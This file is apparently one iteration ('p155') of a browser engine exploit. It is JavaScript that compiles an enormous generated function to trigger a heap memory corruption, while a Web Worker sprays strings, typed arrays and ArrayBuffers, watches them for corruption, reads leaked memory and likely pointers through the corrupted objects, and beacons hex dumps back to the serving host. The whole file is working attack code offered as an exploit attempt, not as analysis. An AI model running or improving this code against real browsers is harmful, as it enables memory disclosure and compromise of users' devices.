// p155 — Lean Worker approach (replicate p146 success)
// NO heap grooming. NO AB spray. Just Worker + compile + call.
// p146 proved this works. p154 failed because grooming moved Worker heap.
// Worker polls strings + uint8arrays. Main thread calls function (no throw).
// finishCreation writes 4.29GB. Worker detects corruption and beacons hex data.
// Process will crash eventually — Worker races to extract data first.
// Beacon prefix: V155-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V155-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // Lean Worker — small footprint, aggressive polling
  var workerCode = [
    'var BASE = "' + BASE + '";',
    'function B(t){try{var x=new XMLHttpRequest();x.open("GET",BASE+"/beacon/V155-W-"+t+"?t="+Date.now(),true);x.send();}catch(e){}}',
    'function hx(v){return(v<16?"0":"")+v.toString(16);}',
    '',
    '// String targets — same size as p146 (~100K chars)',
    'var SL=100076;',
    'var strs=[];',
    'for(var i=0;i<14;i++){',
    '  var s=String.fromCharCode(0x41).repeat(SL);',
    '  s.charCodeAt(0);',
    '  strs.push(s);',
    '}',
    '',
    '// Uint8Array targets',
    'var u8s=[];',
    'for(var i=0;i<20;i++){',
    '  var u=new Uint8Array(48);',
    '  for(var j=0;j<48;j++)u[j]=0xBB;',
    '  u8s.push(u);',
    '}',
    '',
    '// ArrayBuffer targets — 100KB same as metadata buffer size class',
    '// Worker allocates these so they are in Worker heap',
    'var wABs=[];var wViews=[];',
    'for(var i=0;i<10;i++){',
    '  var ab=new ArrayBuffer(100096);',
    '  var v=new Uint8Array(ab);',
    '  v[0]=0xDD;v[1]=0xDD;v[100095]=0xDD;',
    '  wABs.push(ab);wViews.push(v);',
    '}',
    '',
    'B("RDY-S"+strs.length+"-U"+u8s.length+"-A"+wABs.length);',
    'self.postMessage("READY");',
    '',
    'var rpt={};var pN=0;var found=false;',
    '',
    'function poll(){',
    '  pN++;',
    '',
    '  // Check strings',
    '  for(var i=0;i<strs.length;i++){',
    '    try{',
    '      var l=strs[i].length;',
    '      if(l!==SL&&!rpt["s"+i]){',
    '        rpt["s"+i]=1;found=true;',
    '        B("S"+i+"-len="+l+"-p="+pN);',
    '        // Read first 32 chars as hex — this reads through corrupted m_fiber!',
    '        if(l>0&&l<1000000){',
    '          var h="";',
    '          for(var j=0;j<Math.min(32,l);j++){try{h+=hx(strs[i].charCodeAt(j));}catch(e){h+="XX";break;}}',
    '          B("SD"+i+"-"+h);',
    '        }',
    '        // Also try reading at original boundary',
    '        try{',
    '          var bl="";',
    '          for(var j=Math.max(0,SL-4);j<Math.min(SL+8,l,1000000);j++){',
    '            try{bl+=hx(strs[i].charCodeAt(j));}catch(e){bl+="XX";break;}',
    '          }',
    '          if(bl)B("SBD"+i+"-"+bl);',
    '        }catch(e){}',
    '      }',
    '    }catch(e){if(!rpt["se"+i]){rpt["se"+i]=1;found=true;B("SERR"+i+"-p="+pN);}}',
    '  }',
    '',
    '  // Check Uint8Arrays',
    '  for(var i=0;i<u8s.length;i++){',
    '    try{',
    '      if((u8s[i][0]!==0xBB||u8s[i].length!==48)&&!rpt["u"+i]){',
    '        rpt["u"+i]=1;found=true;',
    '        B("U"+i+"-v0="+hx(u8s[i][0])+"-len="+u8s[i].length+"-p="+pN);',
    '        var h="";for(var j=0;j<Math.min(64,u8s[i].length);j++){try{h+=hx(u8s[i][j]);}catch(e){h+="XX";break;}}',
    '        B("UD"+i+"-"+h);',
    '      }',
    '    }catch(e){if(!rpt["ue"+i]){rpt["ue"+i]=1;found=true;B("UERR"+i+"-p="+pN);}}',
    '  }',
    '',
    '  // Check Worker ABs',
    '  for(var i=0;i<wViews.length;i++){',
    '    try{',
    '      if((wViews[i][0]!==0xDD||wViews[i][2]!==0)&&!rpt["a"+i]){',
    '        rpt["a"+i]=1;found=true;',
    '        B("A"+i+"-p="+pN);',
    '        // Dump first 224 bytes (2 metadata entries)',
    '        var h="";for(var j=0;j<224;j++){try{h+=hx(wViews[i][j]);}catch(e){h+="XX";break;}}',
    '        for(var c=0;c<h.length;c+=120)B("AD"+i+"-"+c+"-"+h.substring(c,c+120));',
    '        // Extract 8-byte potential pointers at 8-byte offsets',
    '        var ptrs="";',
    '        for(var p=0;p<224;p+=8){',
    '          var nz=false;for(var v2=0;v2<8;v2++){if(wViews[i][p+v2]!==0){nz=true;break;}}',
    '          if(nz){var h8="";for(var hh=7;hh>=0;hh--)h8+=hx(wViews[i][p+hh]);ptrs+=p+":"+h8+" ";}',
    '        }',
    '        if(ptrs)B("AP"+i+"-"+ptrs.substring(0,200));',
    '      }',
    '    }catch(e){if(!rpt["ae"+i]){rpt["ae"+i]=1;found=true;B("AERR"+i+"-p="+pN);}}',
    '  }',
    '',
    '  if(found)B("FOUND-p="+pN);',
    '  if(pN<20000)setTimeout(poll,1);',
    '  else B("TIMEOUT-"+pN);',
    '}',
    'setTimeout(poll,5);',
  ].join('\n');

  var worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type:'application/javascript'})));
  worker.onmessage = function(ev) {
    B('WM-' + String(ev.data).substring(0, 60));
    if (ev.data === 'READY') startBuild();
  };
  B('WORKER-UP');

  var buildStarted = false;
  // Fallback if READY doesn't come
  setTimeout(function() { if (!buildStarted) { B('READY-TIMEOUT'); startBuild(); } }, 3000);

  function startBuild() {
    if (buildStarted) return;
    buildStarted = true;

    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;
    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p155fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p155ok=1;';
    callChunk = null;

    var blob = new Blob(parts, {type:'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p155ok ? 'OK' : 'FAIL'));
      if (!window.__p155fn) { B('NO-FN'); return; }

      // Give Worker ~200ms head start on polling before we call
      setTimeout(function() {
        B('CALLING');
        // Straight call — no throw. finishCreation + execution.
        // Process will crash but Worker races to capture data.
        try {
          window.__p155fn(function(){});
          B('SURVIVED');
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 50));
        }
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }
})();
